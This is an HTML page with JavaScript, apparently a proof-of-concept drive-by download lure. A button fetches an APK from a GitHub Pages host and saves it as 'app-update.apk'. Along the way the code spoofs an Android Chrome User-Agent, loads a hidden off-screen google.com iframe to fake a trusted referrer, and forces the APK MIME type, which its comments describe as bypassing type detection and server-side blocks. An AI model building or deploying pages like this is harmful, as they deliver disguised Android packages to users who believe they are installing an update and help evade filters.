<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="Referrer-Policy" content="origin"> <!-- Global policy untuk fetch context -->
<style>
.button {
  background-color: #4CAF50;
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
  border-radius: 8px;
}
.hidden-iframe {
  position: absolute;
  left: -9999px;
  width: 1px;
  height: 1px;
}
</style>
</head>
<body>
  <!-- Iframe untuk context Google (no visual, pure referrer sim) -->
  <iframe class="hidden-iframe" src="https://www.google.com"></iframe>
  
  <center><button class="button" onclick="triggerBlobDownload()">Trigger Download</button></center>

  <script>
function triggerBlobDownload() {
  // Load iframe untuk referrer context (no SE, pure tech)
  const iframe = document.querySelector('.hidden-iframe');
  iframe.onload = async () => {
    setTimeout(async () => {  // Delay minimal untuk context settle
      try {
        // Fetch dengan enhanced options: mimic trusted request
        const response = await fetch('https://aliothme.github.io/poc.apk', {
          method: 'GET',
          referrerPolicy: 'origin',  // Kirim origin Google ke server (devtools only)
          headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Pixel) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',  // Mimic Android Chrome (kurangi server-side block)
            'Accept': 'application/vnd.android.package-archive'  // Hint MIME ke browser
          },
          mode: 'cors'  // Force CORS compliance
        });

        if (!response.ok) throw new Error('Fetch failed');

        const blob = await response.blob();
        // Enhanced blob: Set MIME eksplisit untuk bypass type detection
        const enhancedBlob = new Blob([blob], { 
          type: 'application/vnd.android.package-archive; charset=utf-8'  // Standar APK + fallback
        });
        
        const blobUrl = URL.createObjectURL(enhancedBlob);

        // Virtual anchor dengan tweaks untuk cross-browser
        const a = document.createElement('a');
        a.href = blobUrl;
        a.download = 'app-update.apk';  // Nama netral, no "official"
        a.rel = 'noopener';  // Isolasi context, kurangi leak
        document.body.appendChild(a);  // Wajib untuk Firefox
        a.click();  // Trigger download
        document.body.removeChild(a);  // Clean up

        // Revoke setelah delay (hindari memory leak)
        setTimeout(() => URL.revokeObjectURL(blobUrl), 500);

        console.log('Blob download triggered - Origin: local (no spoof possible per 2025 specs)');
      } catch (error) {
        console.error('Error:', error);
      }
    }, 1000);  // Delay 1 detik untuk natural fetch
  };
  // Reload iframe untuk fresh context
  iframe.src = 'https://www.google.com';
}
  </script>
</body>
</html>
